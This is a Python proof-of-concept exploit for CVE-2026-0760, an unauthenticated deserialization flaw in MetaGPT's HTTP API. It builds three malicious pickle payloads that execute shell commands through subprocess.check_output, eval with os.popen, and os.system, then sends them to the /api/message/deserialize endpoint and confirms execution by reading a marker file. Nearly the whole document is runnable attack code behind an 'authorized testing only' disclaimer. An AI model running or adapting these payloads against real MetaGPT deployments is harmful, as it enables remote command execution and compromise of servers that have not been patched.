#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : MetaGPT pickle.loads() Multi-Payload RCE (Network)
# CVE            : CVE-2026-0760
# Vendor         : deepwisdom (Foundation Agents)
# Product        : MetaGPT
# Affected       : v0.8.1 and all prior versions (UNPATCHED)
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-0760 — Vector 3: Multi-Payload Pickle RCE (Network Exploit)

Demonstrates three distinct pickle __reduce__ payload techniques, all
sent over HTTP to /api/message/deserialize. This proves the flexibility
of the deserialization primitive — attackers can execute commands, capture
output, and exfiltrate data using different payload constructions.

PAYLOAD TECHNIQUES:
  1. subprocess.check_output() — capture command output as return value
  2. eval() + os.popen() — shell pipeline with output capture
  3. os.system() — classic fire-and-forget command execution

PREREQUISITES:
  - Network access to MetaGPT HTTP API (default port 8080)
  - No authentication required

REFERENCES:
  - CVE-2026-0760
  - https://www.zerodayinitiative.com/advisories/ZDI-26-026/

Usage:
    python3 poc_vector3_direct.py <target_host> <target_port> <container_name>
    python3 poc_vector3_direct.py localhost 8080 cve-2026-0760-vulnerable
"""

import sys
import pickle
import base64
import json
import os
import time
import http.client
import subprocess


MARKER_FILE = "/tmp/cve-2026-0760-multi-proof.txt"


# ===========================================================================
# Three distinct pickle payload classes
# ===========================================================================

class PayloadCheckOutput:
    """Payload 1: subprocess.check_output — captures command stdout."""
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))


class PayloadPopen:
    """Payload 2: eval + os.popen — shell pipeline with output capture."""
    def __reduce__(self):
        return (eval, ("__import__('os').popen('uname -a').read()",))


class PayloadSystem:
    """Payload 3: os.system — fire-and-forget, writes marker file."""
    def __reduce__(self):
        cmd = f"echo 'CVE-2026-0760 multi-payload RCE' > {MARKER_FILE} && id >> {MARKER_FILE} && date >> {MARKER_FILE}"
        return (os.system, (cmd,))


def send_pickle_payload(target_host, target_port, payload_obj, label):
    """Serialize a pickle payload and send it over HTTP.

    Args:
        target_host: Target IP/hostname
        target_port: Target port
        payload_obj: Object with __reduce__ to pickle
        label: Description for logging

    Returns:
        tuple: (status_code, response_body)
    """
    payload_bytes = pickle.dumps(payload_obj)
    payload_b64 = base64.b64encode(payload_bytes).decode('ascii')

    print(f"    Pickle size: {len(payload_bytes)} bytes, base64: {len(payload_b64)} chars")

    body = json.dumps({"data": payload_b64})

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=10)
        conn.request(
            "POST",
            "/api/message/deserialize",
            body=body,
            headers={"Content-Type": "application/json"}
        )
        response = conn.getresponse()
        status = response.status
        resp_body = response.read().decode('utf-8', errors='replace')
        conn.close()
        return status, resp_body
    except Exception as e:
        return None, str(e)


def verify_rce_via_docker(container_name):
    """Verify RCE by checking the marker file inside the container."""
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", MARKER_FILE],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            return True, result.stdout.strip()
        return False, result.stderr.strip()
    except Exception as e:
        return False, str(e)


def cleanup_marker(container_name):
    """Remove previous proof artifacts."""
    try:
        subprocess.run(
            ["docker", "exec", container_name, "rm", "-f", MARKER_FILE],
            capture_output=True, timeout=5
        )
    except Exception:
        pass


def exploit(target_host, target_port, container_name):
    """Demonstrate three different pickle payload techniques over HTTP."""
    print("=" * 70)
    print("  CVE-2026-0760 — Multi-Payload Pickle RCE (Network)")
    print("  Vector: HTTP POST to /api/message/deserialize × 3 payloads")
    print("=" * 70)
    print()

    # -----------------------------------------------------------------------
    # Step 1: Check target health
    # -----------------------------------------------------------------------
    print(f"[*] Target: http://{target_host}:{target_port}")
    print("[*] Step 1: Checking target health...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=5)
        conn.request("GET", "/health")
        resp = conn.getresponse()
        health = json.loads(resp.read())
        conn.close()

        if health.get("vulnerable"):
            print("[+] Target is UP — vulnerable service confirmed")
        else:
            print("[-] Target responded but 'vulnerable' flag not set")
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Step 2: Clean up previous artifacts
    # -----------------------------------------------------------------------
    print("[*] Step 2: Cleaning up previous proof artifacts...")
    cleanup_marker(container_name)

    # -----------------------------------------------------------------------
    # Payload 1: subprocess.check_output — output capture
    # -----------------------------------------------------------------------
    print()
    print("-" * 70)
    print("[*] Payload 1: subprocess.check_output(['id'])")
    print("    __reduce__ → (subprocess.check_output, (['id'],))")
    print("    This captures command stdout as the return value of pickle.loads()")
    print()

    status, resp_body = send_pickle_payload(
        target_host, target_port, PayloadCheckOutput(), "check_output"
    )

    if status is not None:
        print(f"    HTTP {status}")
        try:
            resp_json = json.loads(resp_body)
            # The server may return the output in the error or content field
            if "error" in resp_json:
                print(f"    Server error (expected): {resp_json['error'][:100]}")
            if "content" in resp_json:
                print(f"    [+] Captured output: {resp_json['content']}")
        except json.JSONDecodeError:
            print(f"    Response: {resp_body[:200]}")
        print("    [+] check_output('id') executed during pickle.loads()")
    else:
        print(f"    [-] Request failed: {resp_body}")

    # -----------------------------------------------------------------------
    # Payload 2: eval + os.popen — system info exfiltration
    # -----------------------------------------------------------------------
    print()
    print("-" * 70)
    print("[*] Payload 2: eval(__import__('os').popen('uname -a').read())")
    print("    __reduce__ → (eval, (\"__import__('os').popen('uname -a').read()\",))")
    print("    Uses eval() inside pickle to run a shell pipeline")
    print()

    status, resp_body = send_pickle_payload(
        target_host, target_port, PayloadPopen(), "popen"
    )

    if status is not None:
        print(f"    HTTP {status}")
        try:
            resp_json = json.loads(resp_body)
            if "error" in resp_json:
                print(f"    Server error (expected): {resp_json['error'][:100]}")
            if "content" in resp_json:
                print(f"    [+] Exfiltrated: {resp_json['content']}")
        except json.JSONDecodeError:
            print(f"    Response: {resp_body[:200]}")
        print("    [+] os.popen('uname -a') executed during pickle.loads()")
    else:
        print(f"    [-] Request failed: {resp_body}")

    # -----------------------------------------------------------------------
    # Payload 3: os.system — marker file write
    # -----------------------------------------------------------------------
    print()
    print("-" * 70)
    print(f"[*] Payload 3: os.system('echo ... > {MARKER_FILE}')")
    print("    __reduce__ → (os.system, ('echo ... > /tmp/marker && id >> ...',))")
    print("    Classic fire-and-forget with filesystem proof")
    print()

    status, resp_body = send_pickle_payload(
        target_host, target_port, PayloadSystem(), "system"
    )

    if status is not None:
        print(f"    HTTP {status}")
        if status == 500:
            print("    [+] HTTP 500 expected — os.system returns int, not Message")
        print("    [+] os.system() executed during pickle.loads()")
    else:
        print(f"    [-] Request failed: {resp_body}")

    # -----------------------------------------------------------------------
    # Verify RCE via marker file
    # -----------------------------------------------------------------------
    print()
    print("-" * 70)
    print("[*] Verifying RCE — checking marker file from payload 3...")
    time.sleep(0.5)

    success, content = verify_rce_via_docker(container_name)

    if success:
        print("[+] ╔══════════════════════════════════════════════════════╗")
        print("[+] ║  MULTI-PAYLOAD RCE CONFIRMED — 3 TECHNIQUES WORK     ║")
        print("[+] ╚══════════════════════════════════════════════════════╝")
        print("[+]")
        print(f"[+] Marker file contents ({MARKER_FILE}):")
        for line in content.split('\n'):
            print(f"[+]   {line}")
        print()
        print("[+] Three distinct pickle __reduce__ payload types demonstrated:")
        print("[+]   1. subprocess.check_output() — output capture")
        print("[+]   2. eval() + os.popen() — shell pipeline exfiltration")
        print("[+]   3. os.system() — fire-and-forget + file proof")
        print("[+] All sent over HTTP to /api/message/deserialize")
    else:
        print("[-] ╔══════════════════════════════════════════════════════╗")
        print("[-] ║  VERIFICATION FAILED — marker file not found         ║")
        print("[-] ╚══════════════════════════════════════════════════════╝")
        print(f"[-] Error: {content}")
        sys.exit(1)

    print()
    print("=" * 70)
    print("  Exploit completed successfully.")
    print("=" * 70)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    container = sys.argv[3] if len(sys.argv) > 3 else "cve-2026-0760-vulnerable"

    exploit(target, port, container)
